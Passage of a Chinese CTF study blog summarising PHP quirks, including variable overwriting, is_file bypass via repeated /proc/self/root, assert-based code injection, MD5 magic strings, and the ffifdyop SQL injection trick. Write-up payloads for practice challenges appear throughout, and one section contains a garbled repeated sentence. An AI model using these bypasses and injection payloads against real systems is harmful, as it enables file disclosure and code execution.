        <content type="html"><![CDATA[<h2 id="4-变量覆盖："><a href="#4-变量覆盖：" class="headerlink" title="4.变量覆盖："></a>4.变量覆盖：</h2><p>在PHP中，符号表（Symbol Table）是一个内部数据结构，用于跟踪当前脚本中定义的变量和它们的值。在PHP脚本执行期间，符号表记录了所有已经声明的变量及其对应的值，并且可以动态地添加、修改和删除这些变量。</p><h3 id="extract："><a href="#extract：" class="headerlink" title="extract："></a>extract：</h3><p>PHP extract() 函数用于将数组中的键作为变量名，将对应的值作为变量值导入到当前程序的符号表中</p><p>extract()导入变量名和值时，如果原来已经存在相同的变量名，那么旧的值会被数组中同名的健对应的值替换掉</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 用户通过表单提交了一些数据，例如：</span><br><span class="line">$hobby=&#x27;play&#x27;;</span><br><span class="line">// 为了方便，直接使用 extract() 函数将 $_GET 数据导入到当前符号表中,以便后续使用</span><br><span class="line">extract($_GET);</span><br><span class="line">echo &quot;用户: &quot;.$name.&quot; 性别: &quot;.$sex.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;your hobby is $hooby&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在小皮上面测试，可以看到，本来hobby的值为play，可以是我们通过get方式传入一个同名变量，使值为study，play就会被study覆盖</p><h3 id="parse-str："><a href="#parse-str：" class="headerlink" title="parse_str："></a>parse_str：</h3><p>解析字符串，如果字符串中含有类似a&#x3D;b字符串，就会把$a&#x3D;b导入到符号表中，可能会覆盖已有变量的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$a=&#x27;hello&#x27;;</span><br><span class="line">$b=&#x27;a=world&#x27;;</span><br><span class="line">parse_str($b);</span><br><span class="line">echo $a;?&gt;</span><br><span class="line">//发现输出world</span><br></pre></td></tr></table></figure><h3 id="："><a href="#：" class="headerlink" title="$$："></a>$$：</h3><p>举个栗子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>foreach遍历<code>$GET</code>数组，如果get传同名变量?a&#x3D;10,在<code>$$key=$value</code>中，会先解析<code>$key</code>为a，然后就会变为<code>$a=10</code>，从而覆盖掉原来a的值(在show上面有个关于这个的题，可以去看看)</p><h3 id="5-import-request-variables："><a href="#5-import-request-variables：" class="headerlink" title="5.import_request_variables："></a>5.import_request_variables：</h3><p>这个函数会把 GET／POST／Cookie 变量导入到全局作用域中，如果程序中已经有同名变量，会造成覆盖</p><h2 id="5-is-file-require-once"><a href="#5-is-file-require-once" class="headerlink" title="5.is_file&amp;&amp;require_once"></a>5.is_file&amp;&amp;require_once</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以直接用compress.zlib:&#x2F;&#x2F;flag.php读取文件，还学到了一个方法，不断重复&#x2F;proc&#x2F;self&#x2F;root使得is_file返回false，简单来说就是这个函数在解析文件路径时是递归调用的，又因为&#x2F;proc&#x2F;self是符号链接，所以要不断递归解析到对应的文件路径，要用符号链接，这个递归层数是有限制的，最高为40，**所以只要&#x2F;proc&#x2F;self&#x2F;root重复超过40次即可，**payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>require_once或include_once都是只包含一次文件的的，也可以尝试用这个绕过</p><h2 id="6-is-numeric-trim："><a href="#6-is-numeric-trim：" class="headerlink" title="6.is_numeric&amp;trim："></a>6.is_numeric&amp;trim：</h2><p>is_numeric是检测传入参数字符串是否是数字，但是在php5中传入符合进制数字的字符串也会返回true，如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(is_numeric(&quot;0x123&quot;));</span><br><span class="line">var_dump(is_numeric(&quot;0123&quot;));</span><br></pre></td></tr></table></figure><p><strong>在php5中都返回true，但在php7都会返回false</strong></p><p>而且<code>is_numeric</code>有一些特殊字符是会忽略的的，如<code>%0C(\f) %2B(+) - . %20(空) </code>，数字字符串里带上这些会true</p><p><strong>trim函数也不会清除<code>\f</code>，即%0C</strong></p><h2 id="7-转换变量字符"><a href="#7-转换变量字符" class="headerlink" title="7.转换变量字符"></a>7.转换变量字符</h2><p>php的变量只允许数字字母和下划线组成，通过get或post传的变量中如果有非法字符会被自动转化为<code>_</code>，<strong>但是这种转化只会发生一次，如果变量名中有两个非法字符，只会转化第一个</strong></p><p>但是特殊符号不能放开头，而且居然不会转化<code>&#123;&#125;</code>，经过测试，通过get或post传会被转化<code>_</code>的字符有<code>%20 . + [</code>这四个字符</p><h2 id="8-SERVER-‘argv’"><a href="#8-SERVER-‘argv’" class="headerlink" title="8.$_SERVER[‘argv’]"></a>8.$_SERVER[‘argv’]</h2><p>使用<code>$_SERVER[&#39;argv&#39;]</code>这个参数需要 php.ini中register_argc_argv&#x3D;on（默认为off）<strong>，这个配置开启时，通过web服务传递的参数可以被解析为命令行参数</strong>，存放在$_SERVER[‘argv’]中，这如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_file_);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argy&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argy&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，argc存放的是参数个数，argv数组存放了所有的参数，<strong>而且各个参数之间通过 + 分割</strong>，当然放<code>$_GET</code>和<code>$_POST</code>数组的参数还是按 &amp; 分割的</p><p>举个栗子(show的真题)：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;think more!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;注意传参！&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先是变量字符转换，要正常传CTF_SHOW.COM，需要传CTF[SHOW.COM,提前让php转化非法字符</p><p>其次是如何让$fl0g&#x3D;&#x3D;&#x3D;”flag_give_me”，尤其在!isset($_GET[‘fl0g’]的情况下</p><p>这时就可以利用$a&#x3D;$_SERVER[‘argv’]，get传?$fl0g&#x3D;flag_give_me，那么就是a就是f l 0 g &#x3D; f l a g g i v e m e 这个字符串，把 c 赋值为 a s s e r t 把这个字符串当作 p h p 代码执行，就能把 fl0g&#x3D;flag_give_me这个字符串，把c赋值为assert把这个字符串当作php代码执行，就能把fl0g&#x3D;flag_give_me这个字符串，把c赋值为assert把这个字符串当作php代码执行，就能把fl0g导入进来，拿到flag，payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get:  ?$fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=assert($a[0]) 不过：php5不能执行assert，php7可以</span><br></pre></td></tr></table></figure><h2 id="9-gettext-get-defind-vars"><a href="#9-gettext-get-defind-vars" class="headerlink" title="9.gettext&amp;get_defind_vars:"></a>9.gettext&amp;get_defind_vars:</h2><p>php的<code>gettext()</code>函数就是返回你传入的参数，什么也不干，安装了gettext拓展后，使用 _() 就相当于 gettext() <strong>这个别名在php5成功能使用</strong></p><p><code>get_defind_vars</code>可以获取当前定义的变量和一些超全局变量，<strong>这个函数在无参数rce时也常用</strong></p><p>举个栗子(show):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$f1 = $_GET[&#x27;f1&#x27;];</span><br><span class="line">$f2 = $_GET[&#x27;f2&#x27;];</span><br><span class="line">if(check($f1))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;嗯哼？&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function check($str)&#123;</span><br><span class="line">    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">flag变量就在flag.php中，而且有call_user_func函数的套娃，想起了xyctf的call_user_func参数的套娃，🤣</span><br><span class="line">传f1为_绕过正则，f2传get_defind_vars，第一次call_user_func(f 1 , f1,f1,f2)就返回get_defind_vars，然后再call_user_func第二次成功调用，打印出flag变量</span><br></pre></td></tr></table></figure><h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><h3 id="优先于-："><a href="#优先于-：" class="headerlink" title="&#x3D;优先于 &amp; |："></a>&#x3D;优先于 &amp; |：</h3><p>举个栗子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);，由于赋值预算比其他运算优先级高，所以v0先被is_numeric($v1)赋值了，后面的不会影响v0的值</span><br></pre></td></tr></table></figure><h3 id="json-decode："><a href="#json-decode：" class="headerlink" title="json_decode："></a>json_decode：</h3><p>php处理json会自动解析unicode编码，但是8进制或16进制无法处理，因此可以用来绕过黑名单</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性总结上</title>
      <link href="/2025/04/24/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93%E4%B8%8A/"/>
      <url>/2025/04/24/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP特性总结上"><a href="#PHP特性总结上" class="headerlink" title="PHP特性总结上"></a>PHP特性总结上</h1><h2 id="1-MD5和hash"><a href="#1-MD5和hash" class="headerlink" title="1.MD5和hash"></a>1.MD5和hash</h2><h3 id="无限制"><a href="#无限制" class="headerlink" title="无限制"></a>无限制</h3><p>在php里面，如果要判断相等的话，有&#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;，前面的是弱相等，只要数值相等就ok了，但是后者的话呢，就是强比较了，需要类型和数值都要相等，在弱类型比较中，<strong>如果是字符串和数字判断，会把字符串转为数字再来判断是否相等</strong>，转换规则如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.&#x27;,‘e’,&#x27;E’并且其数值值在整形的范围之内</span><br><span class="line">该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0</span><br></pre></td></tr></table></figure><p>例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;admin&quot;==0);  // admin开始不为数字，转为0   true</span><br><span class="line">var_dump(&quot;1admin&quot;==1); // 1admin开始为数字1，转为1  true</span><br><span class="line">var_dump(&quot;admin1&quot;==1) //admin1开始不为数字，转为0    false</span><br><span class="line">var_dump(&quot;admin1&quot;==0) //admin1开始不为数字，转为0    true</span><br><span class="line">var_dump(NULL==0)     //true</span><br><span class="line">var_dump(0==false);   //true</span><br><span class="line">var_dump(NULL==false);   //true</span><br><span class="line">var_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>最后一个<code>var_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;)</code>，在比较时，双方都被转为数字，由于有e，所以会被看成 0123456和04456789，结果都是0，自然相等;这个特性常被用于MD5函数的绕过，当然如果是弱相等的话，可以使用数组绕过(强相等也是可以的)了，以及一些以0e开头的md5字符串</p><p>但是总有一些恶心的</p><h3 id="string强转："><a href="#string强转：" class="headerlink" title="string强转："></a>string强转：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=(<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=(<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!=<span class="variable">$b</span> &amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;yes!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里把a和b都强制转为了字符串，数组过不了前面的条件，只能利用md5的缺陷，用fastcoll工具碰撞出md5值相同的但本身不同的字符串 即可</p><p>用法：先新建一个txt，里面写入任意字符串，然后把这个txt拖到fastcoll即可，就会生成两个文本文件，里面分别就是值不同但md5相同的字符串</p><p>再用一个php脚本输出这两个值的url编码，传给a，b即可：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;test_msg1.txt&quot;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;test_msg2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>))===<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a=&quot;</span>.<span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)!=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;b=&quot;</span>.<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就生成相同的字符串了(由于字符串过大，这里就不列举了)</p><h3 id="a-md5-a-："><a href="#a-md5-a-：" class="headerlink" title="a&#x3D;&#x3D;md5(a)："></a>a&#x3D;&#x3D;md5(a)：</h3><p>这就要求自己是0e，且md5后还是0e，上网找到两个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0e215962017</span><br><span class="line">0e251288019</span><br></pre></td></tr></table></figure><p>NULL也是可以被md5的，当md5(a)&#x3D;&#x3D;md5(md5(b))时，可以把a设为NULL，b设为数组</p><p>双MD5后0e</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure><h3 id="MD5sql注入："><a href="#MD5sql注入：" class="headerlink" title="MD5sql注入："></a>MD5sql注入：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php include &#x27;conn.php&#x27;; </span><br><span class="line">highlight_file(__file__); </span><br><span class="line">if (isset($_GET[&#x27;user&#x27;]))</span><br><span class="line"> &#123; </span><br><span class="line">    $query = &quot;SELECT flag FROM here_is_flag WHERE password = &#x27;&quot; . md5($_GET[&quot;user&quot;],true) . &quot;&#x27;&quot;; </span><br><span class="line">    $result = $conn-&gt;query($query); </span><br><span class="line">    $row = $result-&gt;fetch_assoc(); </span><br><span class="line">    var_dump($row); </span><br><span class="line">    $result-&gt;free(); </span><br><span class="line">    $conn-&gt;close(); </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    echo &quot;Please input the user！&lt;br&gt;&quot;; </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>md5函数第二个参数设为true时，会把得到的32为十六进制字符串转为ascii字符串，如果能构造出 类似abc’ or ‘6就能造成sql注入，查询出flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">129581926211651571912466741651878684928</span><br><span class="line">ffifdyop(例如：万能密码)</span><br></pre></td></tr></table></figure><h3 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h3><h4 id="md4后是0e的字符串："><a href="#md4后是0e的字符串：" class="headerlink" title="md4后是0e的字符串："></a>md4后是0e的字符串：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0e001233333333333334557778889</span><br><span class="line">0e00000111222333333666788888889</span><br></pre></td></tr></table></figure><h4 id="sha1后是0e的字符串："><a href="#sha1后是0e的字符串：" class="headerlink" title="sha1后是0e的字符串："></a>sha1后是0e的字符串：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line">0e1290633704</span><br><span class="line">10932435112</span><br></pre></td></tr></table></figure><h2 id="2-intval"><a href="#2-intval" class="headerlink" title="2.intval:"></a>2.intval:</h2><p><a href="https://blog.csdn.net/wangyuxiang946/article/details/131156104">https://blog.csdn.net/wangyuxiang946/article/details/131156104</a> (强烈推荐)</p><p>记一下刷题经常遇到的考点：</p><h3 id="科学表达式字符串："><a href="#科学表达式字符串：" class="headerlink" title="科学表达式字符串："></a>科学表达式字符串：</h3><p>php&lt;7.2.25时，intval函数<strong>不能正常解析字符串形式的科学表达式</strong>，会返回底数，如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">var_dump(intval(1e2));  #返回100</span><br><span class="line">var_dump(intval(&#x27;1e2&#x27;));#返回1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="数组："><a href="#数组：" class="headerlink" title="数组："></a>数组：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br></pre></td></tr></table></figure><p>正常来说，字符串被一般intval转化都是0，就算转为非0，要在字符串开头含有数字，无法绕过正则</p><p>但是这里可以传数组，<strong>intval处理数组会返回数字1</strong>,传?num[]&#x3D;1即可</p><h3 id="自动进制转换："><a href="#自动进制转换：" class="headerlink" title="自动进制转换："></a>自动进制转换：</h3><table><thead><tr><th>0x开头</th><th>0开头</th><th>正常</th></tr></thead><tbody><tr><td>16进制</td><td>8进制</td><td>10进制</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(intval(&#x27;0x64&#x27;,0));</span><br><span class="line">var_dump(intval(&#x27;0144&#x27;,0));</span><br><span class="line">var_dump(intval(&#x27;100&#x27;,0));</span><br><span class="line">#结果都是100</span><br></pre></td></tr></table></figure><h3 id="浮点数处理："><a href="#浮点数处理：" class="headerlink" title="浮点数处理："></a>浮点数处理：</h3><p>intval转换浮点数，有小数位会直接把小数位去掉，没有四舍五入，如<code>intval(3.9)=3</code>，<strong>intval(‘+0x64’,0)&#x3D;100</strong>，数字前可以加<code>+</code>不影响解析</p><h2 id="3-preg-match正则："><a href="#3-preg-match正则：" class="headerlink" title="3.preg_match正则："></a>3.preg_match正则：</h2><p>这里就要讲一下在php里面关于正则的东西了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match(’/php/’,php)</span><br><span class="line">  参数1 模式</span><br><span class="line">  参数2 字符串</span><br></pre></td></tr></table></figure><h3 id="正则表达式中的元素："><a href="#正则表达式中的元素：" class="headerlink" title="正则表达式中的元素："></a>正则表达式中的元素：</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h4><p>  1、正则表达式中包含三种元素分别为：量词、元字符、修饰符<br>  2、前导字符串：就是符号前面的一个字符或字符串</p><h4 id="量词："><a href="#量词：" class="headerlink" title="量词："></a>量词：</h4><table><thead><tr><th>+</th><th align="left">匹配任何至少包含一个前导字符串</th></tr></thead><tbody><tr><td>*</td><td align="left">匹配任何包含零个或多个前导字符串</td></tr><tr><td>?</td><td align="left">匹配任何包含零个或1个前导字符串</td></tr><tr><td>.</td><td align="left">匹配任意一个字符串</td></tr><tr><td>{x}</td><td align="left">匹配任何包含x个前导字符串</td></tr><tr><td>{x,y}</td><td align="left">匹配任何包含 x 到 y 个前导字符串</td></tr><tr><td>{x,}</td><td align="left">匹配任何包含至少x个前导字符串</td></tr><tr><td>^</td><td align="left">匹配字符串的行首</td></tr><tr><td>$</td><td align="left">匹配字符串的行尾</td></tr><tr><td>|</td><td align="left">选择符 匹配字符串的左边或者右边</td></tr><tr><td>()</td><td align="left">分组，提取</td></tr></tbody></table><h4 id="元字符："><a href="#元字符：" class="headerlink" title="元字符："></a>元字符：</h4><table><thead><tr><th align="left">[a-z]</th><th>匹配任何包含小写字母a-z的字符串</th></tr></thead><tbody><tr><td align="left">[A-Z]</td><td>匹配任何包含大写字母A-Z的字符串</td></tr><tr><td align="left">[0-9]</td><td>匹配任何包含0-9的字符串</td></tr><tr><td align="left">[abc]</td><td>匹配任何包含小写字母a,b,c的字符串</td></tr><tr><td align="left">[^abc]</td><td>匹配任何不包含小写字母a,b,c的字符串</td></tr><tr><td align="left">[a-zA-Z0-9_]</td><td>匹配任何包含a-zA-Z0-9和下划线的字符串</td></tr><tr><td align="left">\w</td><td>匹配任何包含a-zA-Z0-9和下划线的字符串</td></tr><tr><td align="left">\W</td><td>匹配任何不包含a-zA-Z0-9和下划线的字符串</td></tr><tr><td align="left">\d</td><td>匹配任何包含数字字符</td></tr><tr><td align="left">\D</td><td>匹配任何非数字字符</td></tr><tr><td align="left">\s</td><td>匹配任何空白字符</td></tr><tr><td align="left">\S</td><td>匹配任何非空白字符</td></tr><tr><td align="left">\b</td><td>匹配是否到达了单词边界</td></tr><tr><td align="left">\B</td><td>匹配没有到达了单词边界</td></tr><tr><td align="left">\</td><td>匹配正则中的特殊字符</td></tr></tbody></table><h4 id="修饰符："><a href="#修饰符：" class="headerlink" title="修饰符："></a>修饰符：</h4><table><thead><tr><th>i</th><th>完全不区分大小写</th></tr></thead><tbody><tr><td>m</td><td>可以采用多行识别,遇到换行也承认匹配规则</td></tr><tr><td>x</td><td>忽略掉规则模式中的空白字符</td></tr><tr><td>A</td><td>强制从头开始匹配</td></tr><tr><td>U</td><td>禁止贪婪匹配，只跟踪到最近的一个匹配符并结束</td></tr></tbody></table><h4 id="正则常用的函数："><a href="#正则常用的函数：" class="headerlink" title="正则常用的函数："></a>正则常用的函数：</h4><h5 id="1、preg-grep"><a href="#1、preg-grep" class="headerlink" title="1、preg_grep()"></a>1、preg_grep()</h5><p>  搜索数组中的所有元素，返回与某个模式匹配的字符串数组</p><h5 id="2、preg-match"><a href="#2、preg-match" class="headerlink" title="2、preg_match()"></a>2、preg_match()</h5><p>  搜索模式，匹配返回true，不匹配返回false</p><h5 id="3、preg-match-all"><a href="#3、preg-match-all" class="headerlink" title="3、preg_match_all()"></a>3、preg_match_all()</h5><p>  在字符串匹配模式的所有出现，然后将所有匹配的全部放入数组</p><h5 id="4、preg-quote"><a href="#4、preg-quote" class="headerlink" title="4、preg_quote()"></a>4、preg_quote()</h5><p>  将特殊字符转义<br>  特殊字符包含 $ ^ * () + &#x3D; {} [] | \ : &lt;&gt;<br>  定界正则，在每一个对于正则表达式语法而言有特殊含义的字符前插入一个反斜杠</p><h5 id="5、preg-replace"><a href="#5、preg-replace" class="headerlink" title="5、preg_replace()"></a>5、preg_replace()</h5><p>  替换模式的所有出现，然后替换成想要的字符串返回出来</p><h5 id="6、preg-split"><a href="#6、preg-split" class="headerlink" title="6、preg_split()"></a>6、preg_split()</h5><p>  以不区分大小写将字符串划分不同的元素</p><h3 id="换行绕过"><a href="#换行绕过" class="headerlink" title="换行绕过"></a>换行绕过</h3><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过."></a>绕过.</h4><p>类似于<code>preg_match(&#39;/^.*(flag).*$/&#39;,$a)</code>在关键词前后＋了.，可以使用换行符%0a,绕过检测，<strong>.不匹配换行符</strong> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">举个栗子：a=%0aflag;b=flag;print(a==b);true</span><br></pre></td></tr></table></figure><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过$"></a>绕过$</h4><p>$是匹配文本结束的字符，<strong>会忽略结尾的换行</strong> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">举个栗子：a=abc;b=abc%0a;print(a==b);true</span><br></pre></td></tr></table></figure><p><strong>preg_replace</strong>也可以用同样的方法来绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;^flag$/im&#x27;),$a)&#123;if(preg_match(&#x27;^flag$/i&#x27;)&#123;echo I like flag&#125;&#125; 